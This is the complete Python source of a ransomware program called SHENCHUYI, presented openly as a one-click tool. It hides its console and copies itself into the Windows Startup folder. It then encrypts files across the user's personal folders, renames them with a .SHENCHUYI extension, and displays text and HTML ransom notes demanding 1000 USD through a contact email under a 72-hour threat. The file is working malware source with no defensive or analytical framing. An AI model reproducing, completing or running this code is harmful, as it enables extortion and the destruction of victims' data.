import os
import sys
import subprocess
import tempfile
import ctypes
import time
import platform
import base64
from cryptography.fernet import Fernet

# =============================================================================
# STANDALONE / ONE-CLICK RANSOMWARE - SHENCHUYI
# Created by: ayyubi
# =============================================================================

# Constants
EXTENSION = ".SHENCHUYI"
RANSOM_NAME = "SHENCHUYI"
RANSOM_AMOUNT = "1000 USD"
CONTACT_EMAIL = "fatcatfatcat63@gmail.com"
AUTHOR = "ayyubi"

# Path for the key file
KEY_FILE = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), "shenchuyi_key.key")

# HTML ransom note content - full embedded
RANSOM_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SHENCHUYI RANSOMWARE</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Courier New',monospace;background:#8B0000;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}
.container{max-width:800px;width:100%;background:rgba(0,0,0,0.9);border-radius:20px;padding:40px;box-shadow:0 25px 50px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.2);text-align:center;}
h1{font-size:3rem;margin-bottom:20px;letter-spacing:4px;text-shadow:3px 3px 0 #4a0000;color:#ff4444;}
.subtitle{font-size:0.9rem;color:#ffaaaa;margin-bottom:30px;letter-spacing:2px;}
.amount{font-size:2.5rem;font-weight:bold;color:#ff4444;background:rgba(0,0,0,0.5);padding:15px;border-radius:10px;margin:20px 0;}
.email{font-size:1.3rem;background:#1a1a2a;padding:12px;border-radius:8px;margin:20px 0;word-break:break-all;color:#ff8888;}
.warning{background:rgba(255,0,0,0.3);padding:15px;border-radius:8px;margin:20px 0;font-size:0.85rem;text-align:left;color:#fff;}
.warning ul{margin-left:20px;margin-top:10px;}
.warning li{margin:8px 0;}
.footer{margin-top:30px;font-size:0.7rem;color:#aaa;border-top:1px solid #333;padding-top:20px;}
.blink{animation:blink 1s step-end infinite;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
button{background:#ff4444;border:none;padding:12px 30px;font-size:1rem;font-weight:bold;color:white;border-radius:30px;cursor:pointer;margin-top:20px;}
button:hover{background:#cc0000;}
</style>
</head>
<body>
<div class="container">
<h1>SHENCHUYI</h1>
<div class="subtitle">RANSOMWARE</div>
<div style="font-size:1.2rem;margin:20px 0;color:#fff;">YOUR FILES HAVE BEEN ENCRYPTED</div>
<div class="amount">RANSOM: 1000 USD</div>
<div class="email">CONTACT: fatcatfatcat63@gmail.com</div>
<div class="warning">
<strong>WHAT HAPPENED?</strong>
<ul><li>All your important files have been encrypted with AES-256 encryption</li><li>Your files have been renamed with extension: <strong>.SHENCHUYI</strong></li><li>You cannot access your documents, photos, databases, or other important files</li></ul>
<br>
<strong>HOW TO RECOVER YOUR FILES?</strong>
<ul><li>Send <strong>1000 USD</strong> in Bitcoin or USDT</li><li>Email us at: <strong>fatcatfatcat63@gmail.com</strong> with your personal ID code</li><li>You will receive the decryption tool and your unique key</li></ul>
<br>
<strong>WARNINGS:</strong>
<ul><li>DO NOT attempt to decrypt files yourself - permanent data loss may occur</li><li>DO NOT rename or modify encrypted files</li><li>DO NOT contact data recovery services - they will waste your time and money</li><li>You have <span class="blink">72 HOURS</span> to pay, after which the key will be destroyed</li></ul>
</div>
<div class="footer">SHENCHUYI RANSOMWARE | Created by: ayyubi | AES-256 ENCRYPTION</div>
<button onclick="window.close()">Close</button>
</div>
</body>
</html>'''

# =============================================================================
# RANSOMWARE FUNCTIONS
# =============================================================================

def generate_key():
    try:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
        return True
    except:
        return False

def load_key():
    try:
        return open(KEY_FILE, "rb").read()
    except:
        return None

def encrypt_file(file_path, key):
    try:
        fernet = Fernet(key)
        with open(file_path, "rb") as file:
            file_data = file.read()
        if len(file_data) == 0:
            return False
        encrypted_data = fernet.encrypt(file_data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        return True
    except:
        return False

def decrypt_file(file_path, key):
    try:
        fernet = Fernet(key)
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = fernet.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data)
        return True
    except:
        return False

def encrypt_file_in_directory(directory, key):
    encrypted_count = 0
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.endswith(EXTENSION):
                    continue
                
                # Skip system and program files
                skip_patterns = ['Windows', 'Program Files', 'Program Files (x86)', 'System32', 
                                'AppData', 'Microsoft', 'Temp', 'tmp', 'cache', 'Cache',
                                'boot', 'sys', 'bin', 'lib', 'etc', 'proc', 'dev']
                skip = False
                for pattern in skip_patterns:
                    if pattern.lower() in file_path.lower():
                        skip = True
                        break
                if skip:
                    continue
                
                # Skip files that are too large or too small
                try:
                    if os.path.getsize(file_path) > 100 * 1024 * 1024:  # Skip files > 100MB
                        continue
                except:
                    continue
                
                if encrypt_file(file_path, key):
                    try:
                        os.rename(file_path, file_path + EXTENSION)
                        encrypted_count += 1
                    except:
                        pass
    except:
        pass
    return encrypted_count

# =============================================================================
# RANSOM NOTE DISPLAY
# =============================================================================

def show_ransom_note():
    try:
        html_path = os.path.join(os.environ.get('TEMP', tempfile.gettempdir()), "SHENCHUYI_NOTE.html")
        
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(RANSOM_HTML)
        
        # Try multiple browsers
        browsers_to_try = []
        
        if platform.system() == "Windows":
            browsers_to_try = [
                r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                r"C:\Program Files\Mozilla Firefox\firefox.exe",
                r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
                r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
            ]
        
        opened = False
        for browser in browsers_to_try:
            if os.path.exists(browser):
                try:
                    subprocess.Popen([browser, html_path], shell=False)
                    opened = True
                    break
                except:
                    continue
        
        if not opened:
            # Fallback to default browser
            os.startfile(html_path) if platform.system() == "Windows" else webbrowser.open(html_path)
    except:
        try:
            webbrowser.open(html_path)
        except:
            pass

# =============================================================================
# CREATE README FILE
# =============================================================================

def create_readme(encrypted_count):
    readme_content = f"""
================================================================================
                        SHENCHUYI RANSOMWARE
================================================================================

[!] YOUR FILES HAVE BEEN ENCRYPTED [!]

Total files encrypted: {encrypted_count}
Encrypted extension: .SHENCHUYI

================================================================================
                          WHAT HAPPENED?
================================================================================

All your important files have been encrypted with AES-256 encryption.
The encryption key is unique to your system.

You cannot decrypt your files without our decryption key.

================================================================================
                        HOW TO RECOVER FILES?
================================================================================

To recover your files, you need to pay a ransom of:
                    1000 USD

Payment instructions:
1. Contact: fatcatfatcat63@gmail.com
2. Send proof of payment
3. You will receive the decryption key and tool

================================================================================
                            WARNINGS
================================================================================

- DO NOT attempt to decrypt files yourself (will cause permanent data loss)
- DO NOT rename or modify encrypted files
- DO NOT contact data recovery services (they will waste your time and money)
- You have 72 HOURS to pay (after that, the key will be destroyed)

================================================================================
                    CONTACT FOR DECRYPTION
================================================================================

Email: fatcatfatcat63@gmail.com
Subject: [SHENCHUYI] - YOUR_COMPUTER_NAME

================================================================================
Created by: ayyubi
"""
    
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop", "SHENCHUYI_README.txt")
        with open(desktop, 'w', encoding='utf-8') as f:
            f.write(readme_content)
    except:
        pass
    
    try:
        documents = os.path.join(os.path.expanduser("~"), "Documents", "SHENCHUYI_README.txt")
        with open(documents, 'w', encoding='utf-8') as f:
            f.write(readme_content)
    except:
        pass

# =============================================================================
# PERSISTENCE - Auto start on boot
# =============================================================================

def add_to_startup():
    try:
        if platform.system() == "Windows":
            current_file = sys.argv[0]
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            
            startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            dest = os.path.join(startup_folder, 'ShenchuyiHelper.exe')
            
            if os.path.exists(current_file):
                import shutil
                if not os.path.exists(dest):
                    shutil.copy2(current_file, dest)
    except:
        pass

# =============================================================================
# GET TARGET DIRECTORIES
# =============================================================================

def get_target_directories():
    user_profile = os.path.expanduser("~")
    target_dirs = []
    
    possible_dirs = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Documents"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Pictures"),
        os.path.join(user_profile, "Music"),
        os.path.join(user_profile, "Videos"),
        os.path.join(user_profile, "OneDrive"),
        user_profile
    ]
    
    for d in possible_dirs:
        if os.path.exists(d):
            target_dirs.append(d)
    
    return target_dirs

# =============================================================================
# HIDE CONSOLE
# =============================================================================

def hide_console():
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

# =============================================================================
# INSTALL DEPENDENCIES AUTOMATICALLY
# =============================================================================

def install_cryptography():
    try:
        import cryptography
        return True
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography", "--quiet", "--disable-pip-version-check"])
            return True
        except:
            return False

# =============================================================================
# MAIN FUNCTION
# =============================================================================

def main():
    # Hide console for stealth
    try:
        hide_console()
    except:
        pass
    
    # Install cryptography if not available
    install_cryptography()
    
    # Add to startup
    try:
        add_to_startup()
    except:
        pass
    
    # Generate encryption key if it does not exist
    if not os.path.exists(KEY_FILE):
        generate_key()
    
    key = load_key()
    if key is None:
        return
    
    total_encrypted = 0
    target_directories = get_target_directories()
    
    # Encrypt files in all target directories
    for directory in target_directories:
        try:
            encrypted = encrypt_file_in_directory(directory, key)
            total_encrypted += encrypted
        except:
            pass
    
    # Create README on Desktop
    if total_encrypted > 0:
        try:
            create_readme(total_encrypted)
        except:
            pass
        
        # Show ransom note in browser
        try:
            time.sleep(1)
            show_ransom_note()
        except:
            pass

# =============================================================================
# DECRYPT FUNCTION (for recovery)
# =============================================================================

def decrypt_all():
    try:
        if not os.path.exists(KEY_FILE):
            return
        
        key = load_key()
        if key is None:
            return
        
        total_decrypted = 0
        target_directories = get_target_directories()
        
        for directory in target_directories:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if file.endswith(EXTENSION):
                            file_path = os.path.join(root, file)
                            original_path = file_path[:-len(EXTENSION)]
                            if decrypt_file(file_path, key):
                                try:
                                    os.rename(file_path, original_path)
                                    total_decrypted += 1
                                except:
                                    pass
    except:
        pass

# =============================================================================
# ENTRY POINT
# =============================================================================

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        decrypt_all()
    else:
        main()